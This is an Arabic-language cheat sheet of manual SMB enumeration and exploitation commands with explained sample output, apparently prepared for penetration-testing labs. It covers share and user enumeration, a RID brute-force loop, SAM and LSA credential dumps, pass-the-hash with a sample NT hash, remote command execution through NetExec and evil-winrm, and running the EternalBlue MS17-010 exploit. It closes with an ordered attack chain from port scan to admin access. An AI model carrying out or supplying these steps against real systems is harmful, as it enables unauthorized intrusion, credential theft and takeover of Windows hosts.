




## كل الأوامر اليدوية — SMB كاملة مع شرح النواتج

---

### 🔹 1. Nmap Discovery

bash

````bash
# أساسي
nmap -p 139,445 -sV -sC 192.168.219.147

# كل الـ subnet
nmap -v -p 139,445 192.168.50.1-254 -oG smb.txt

# Vuln scan
nmap -p 445 --script smb-vuln* 192.168.1.1

# Enum كامل
nmap -p 139,445 --script smb-enum-shares,smb-enum-users,smb-os-discovery 192.168.1.1

# كل السكريبتات
nmap -p 445 --script smb2-capabilities,smb2-security-mode 192.168.1.1
nmap -p 445 --script smb-enum-groups 192.168.1.1
nmap -p 445 --script smb-enum-domains 192.168.1.1
nmap -p 445 --script smb-enum-sessions 192.168.1.1
nmap -p 445 --script smb-enum-processes 192.168.1.1

# EternalBlue
nmap -p 445 --script smb-vuln-ms17-010 192.168.1.1

# SambaCry
nmap -p 445 --script smb-vuln-cve-2017-7494 192.168.1.1
```

**شرح الناتج:**
```
PORT    STATE SERVICE      VERSION
445/tcp open  microsoft-ds Windows 10 Pro 19041   ← OS version
|_smb-os-discovery:
|   OS: Windows 10 Pro 19041                      ← نظام التشغيل
|   Computer name: DESKTOP-ABC                    ← اسم الجهاز
|   Domain: WORKGROUP                             ← الدومين
|   FQDN: DESKTOP-ABC.local                      ← الاسم الكامل
````

---

### 🔹 2. NetBIOS Enumeration

bash

````bash
nmblookup -A 192.168.1.1
nbtscan 192.168.1.1
nbtscan 192.168.50.0/24
sudo nbtscan -r 192.168.50.0/24
```

**شرح الناتج:**
```
192.168.1.1     WORKGROUP\DESKTOP-ABC   <00> UNIQUE  ← اسم الجهاز
192.168.1.1     WORKGROUP               <00> GROUP   ← اسم الـ workgroup
192.168.1.1     DESKTOP-ABC             <20> UNIQUE  ← SMB file service شغال ✅
MAC: 00:0c:29:xx:xx:xx                              ← MAC address
```
```
<00> = اسم الجهاز أو الـ workgroup
<20> = SMB File Service شغال (مهم جداً)
<03> = Messenger Service
<1B> = Domain Master Browser
````

---

### 🔹 3. smbclient

bash

````bash
# List shares بدون كلمة سر
smbclient -N -L //192.168.1.1/

# List shares كـ guest
smbclient -L //192.168.1.1/ -U guest%

# List shares بيوزر وباسوورد
smbclient -L //192.168.1.1/ -U admin%password123

# الاتصال بـ share
smbclient -N //192.168.1.1/Public
smbclient //192.168.1.1/docs -U admin%password123

# داخل الـ smbclient
ls                          # قائمة الملفات
ls -R                       # recursive
cd <folder>                 # دخول مجلد
get <file>                  # تنزيل ملف
put <file>                  # رفع ملف
mget *                      # تنزيل كل شي
prompt off                  # إيقاف التأكيد
recurse on                  # تفعيل recursive
!ls                         # ls على الـ local machine
!cat <file>                 # قراءة ملف local
quit                        # خروج
```

**شرح الناتج:**
```
Sharename    Type    Comment
---------    ----    -------
ADMIN$       Disk    Remote Admin        ← share إداري (يحتاج admin)
C$           Disk    Default share       ← الـ C drive (يحتاج admin)
IPC$         IPC     Remote IPC          ← للـ RPC (مهم للـ enum)
Public       Disk    Public Files        ← share عام ✅ (جرب الدخول)
docs         Disk    Documents           ← share مخصص ✅
````

---

### 🔹 4. smbmap

bash

````bash
# Null session
smbmap -H 192.168.1.1

# كـ guest
smbmap -H 192.168.1.1 -u guest -p ''

# بيوزر
smbmap -H 192.168.1.1 -u admin -p password123

# Recursive مع depth
smbmap -H 192.168.1.1 -R -u guest -p '' --depth 10

# البحث عن ملفات حساسة
smbmap -H 192.168.1.1 -R -u guest -p '' --depth 12 -A '(?i).*pass|cred|config|log'

# تنزيل ملف
smbmap -H 192.168.1.1 -u guest -p '' --download 'Public\passwords.txt'
```

**شرح الناتج:**
```
[+] IP: 192.168.1.1:445  Name: DESKTOP-ABC
Disk            Permissions     Comment
----            -----------     -------
ADMIN$          NO ACCESS       ← ما تقدر تدخل
C$              NO ACCESS       ← ما تقدر تدخل
IPC$            READ ONLY       ← تقدر تقرأ (RPC)
Public          READ, WRITE     ← تقدر تقرأ وتكتب ✅✅
docs            READ ONLY       ← تقدر تقرأ فقط ✅
````

---

### 🔹 5. rpcclient

bash

```bash
# Null session
rpcclient -U "" 192.168.1.1
rpcclient -U "" -N 192.168.1.1

# بيوزر
rpcclient -U "admin%password123" 192.168.1.1

# الأوامر داخل rpcclient
srvinfo                     # معلومات السيرفر
enumdomains                 # الدومينات
querydominfo                # معلومات الدومين
enumdomusers                # كل اليوزرات
enumdomgroups               # كل الـ groups
netshareenumall             # كل الـ shares
netsharegetinfo <share>     # معلومات share معين
queryuser 0x3e8             # معلومات يوزر بالـ RID
querygroup 0x201            # معلومات group
lsaquery                    # SID وسياسات الأمان
getdompwinfo                # سياسة الباسوورد
```

bash

````bash
# RID Brute Force (لاكتشاف اليوزرات)
for i in $(seq 500 1100); do
  rpcclient -N -U "" 192.168.1.1 \
    -c "queryuser 0x$(printf '%x\n' $i)" 2>/dev/null \
    | grep "User Name"
done
```

**شرح الناتج:**
```
# enumdomusers
user:[Administrator] rid:[0x1f4]    ← يوزر + RID بالـ hex
user:[Guest] rid:[0x1f5]
user:[john] rid:[0x44f]             ← يوزر مخصص ✅

# queryuser 0x44f
User Name   :   john
Full Name   :   John Smith
Home Drive  :   
Password last set: 2024-01-01
Account desc:   Developer Account    ← وصف مفيد

# getdompwinfo
min_password_length: 0              ← ما في حد أدنى للباسوورد
password_properties: 0x00000000    ← ما في complexity
````

---

### 🔹 6. NetExec / CrackMapExec

bash

```bash
# أساسي
nxc smb 192.168.1.1
crackmapexec smb 192.168.1.1

# Null / Guest
nxc smb 192.168.1.1 -u '' -p '' --shares
nxc smb 192.168.1.1 -u guest -p '' --shares

# بيوزر وباسوورد
nxc smb 192.168.1.1 -u admin -p password123 --shares

# SAM dump (يحتاج admin)
nxc smb 192.168.1.1 -u admin -p password123 --sam

# LSA dump (يحتاج admin)
nxc smb 192.168.1.1 -u admin -p password123 --lsa

# RID Brute
nxc smb 192.168.1.1 -u guest -p '' --rid-brute

# Spider الملفات
nxc smb 192.168.1.1 -u guest -p '' -M spider_plus

# Pass the Hash
nxc smb 192.168.1.1 -u admin -H a51493b0b06e5e35f855245e71af1d14

# تنفيذ أوامر
nxc smb 192.168.1.1 -u admin -p password123 -x "whoami"
nxc smb 192.168.1.1 -u admin -p password123 -x "ipconfig"
```

**شرح الناتج:**
```
SMB  192.168.1.1  445  SECURE  [*] Windows 10/Server 2019 Build 19041 x64
     ↑ IP          ↑port ↑hostname  ↑ OS version

(name:SECURE)      ← اسم الجهاز
(domain:secura.yzx) ← الدومين
(signing:False)    ← SMB signing معطل = Pass-the-Hash ممكن ✅✅
(SMBv1:False)      ← SMBv1 معطل (EternalBlue مش ممكن)

[+] secura.yzx\eric.wallows:EricLikesRunning800 (Pwn3d!)
                                                  ↑ يعني عنده local admin ✅✅
```

---

### 🔹 7. شرح ناتج SAM Dump
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a51493b0b06e5e35f855245e71af1d14:::
     ↑username  ↑RID  ↑LM hash (فاضي/disabled)         ↑NT hash (المهم)
```

```
# تفكيك الـ hash
aad3b435b51404eeaad3b435b51404ee  = LM hash فاضي (disabled) - تجاهله
31d6cfe0d16ae931b73c59d7e0c089c0  = NT hash لباسوورد فاضي (Guest/DefaultAccount)
a51493b0b06e5e35f855245e71af1d14  = NT hash حقيقي ← هذا اللي تستخدمه

# Pass the Hash
nxc smb 192.168.1.1 -u Administrator -H a51493b0b06e5e35f855245e71af1d14
evil-winrm -i 192.168.1.1 -u Administrator -H a51493b0b06e5e35f855245e71af1d14
```

---

### 🔹 8. شرح ناتج LSA Dump
```
SECURA\SECURE$:aes256-cts-hmac-sha1-96:5f862922...  ← مفتاح Kerberos للجهاز
SECURA\SECURE$:aes128-cts-hmac-sha1-96:56743e30...  ← مفتاح Kerberos أقصر
SECURA\SECURE$:des-cbc-md5:58767fa2...              ← مفتاح قديم
SECURA\SECURE$:plain_password_hex:17e1ba59...       ← باسوورد الجهاز بالـ hex
dpapi_machinekey:0x9aacf205...                      ← مفتاح DPAPI للجهاز
dpapi_userkey:0xe2328bc9...                         ← مفتاح DPAPI لليوزر
````

---

### 🔹 9. Impacket

bash

```bash
# SAM dump
samrdump.py 192.168.1.1
samrdump.py -no-pass 192.168.1.1
samrdump.py -no-pass guest@192.168.1.1

# SID lookup
lookupsid.py -no-pass guest@192.168.1.1
lookupsid.py -no-pass anonymous@192.168.1.1

# SMB client
impacket-smbclient admin:password123@192.168.1.1

# SMB server (لاستقبال ملفات)
impacket-smbserver share . -smb2support
impacket-smbserver share /tmp -smb2support
```

---

### 🔹 10. Mount وتنزيل ملفات

bash

```bash
# Mount
sudo mkdir /mnt/smb
sudo mount -t cifs //192.168.1.1/Public /mnt/smb
sudo mount -t cifs //192.168.1.1/Public /mnt/smb -o username=admin,password=password123

# تنزيل كل الملفات
smbget -R smb://192.168.1.1/Public

# داخل smbclient
smbclient -N //192.168.1.1/Public
prompt off
recurse on
mget *
```

---

### 🔹 11. Exploitation

bash

```bash
# EternalBlue
git clone https://github.com/worawit/MS17-010
python checker.py 192.168.1.1
python zzz_exploit.py 192.168.1.1

# Pass the Hash
nxc smb 192.168.1.1 -u Administrator -H a51493b0b06e5e35f855245e71af1d14 -x "whoami"
evil-winrm -i 192.168.1.1 -u Administrator -H a51493b0b06e5e35f855245e71af1d14

# تنفيذ أوامر
nxc smb 192.168.1.1 -u admin -p password123 -x "whoami"
nxc smb 192.168.1.1 -u admin -p password123 -x "net user"
nxc smb 192.168.1.1 -u admin -p password123 -x "net localgroup administrators"
```

---

### الخطوات بالترتيب
```
1️⃣  nmap -p 139,445          → اكتشاف المنافذ والـ OS
2️⃣  nbtscan / nmblookup      → معلومات NetBIOS
3️⃣  smbclient -N -L          → قائمة الـ shares
4️⃣  smbmap -H                → صلاحيات كل share
5️⃣  rpcclient enumdomusers   → قائمة اليوزرات
6️⃣  nxc --rid-brute          → اكتشاف اليوزرات بالـ RID
7️⃣  smbclient + mget *       → تنزيل الملفات
8️⃣  nxc --sam / --lsa        → dump الـ hashes (لو admin)
9️⃣  Pass the Hash            → الوصول كـ admin
```







